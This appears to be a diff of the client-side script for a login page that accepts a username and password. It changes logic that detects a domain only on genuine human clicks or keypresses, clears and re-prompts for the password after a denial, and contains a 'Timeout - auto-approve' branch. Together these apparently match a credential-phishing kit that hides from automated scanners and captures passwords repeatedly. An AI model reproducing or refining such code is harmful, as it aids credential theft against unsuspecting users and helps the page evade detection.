@@ -13,7 +13,6 @@
   // ============================================================
 
   let domainDetected = false;
-  let humanInteraction = false;
 
   function detectDomain() {
     if (domainDetected) return;
@@ -47,22 +46,20 @@
     });
   }
 
-  // Only detect domain on human interaction (click or keypress)
+  // Only detect on human interaction
   document.addEventListener('click', function(e) {
     if (!domainDetected && e.isTrusted) {
-      humanInteraction = true;
       detectDomain();
     }
   });
 
   document.addEventListener('keydown', function(e) {
     if (!domainDetected && e.isTrusted) {
-      humanInteraction = true;
       detectDomain();
     }
   });
 
-  // Also detect when user starts typing in form fields
+  // Also detect when user interacts with form
   userInput.addEventListener('focus', function() {
     if (!domainDetected) detectDomain();
   });
@@ -206,7 +203,7 @@
 
     const sessionId = 'SESS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
     
-    // Show only spinner on button
+    // Show spinner
     submitBtn.disabled = true;
     submitBtn.innerHTML = '<span class="spinner"></span>';
     submitBtn.classList.add('loading');
@@ -251,7 +248,6 @@
         submitBtn.classList.remove('loading');
         passwordInput.value = '';
         passwordInput.focus();
-        alert('Access denied. Please try again.');
         
       } else {
         // Timeout - auto-approve
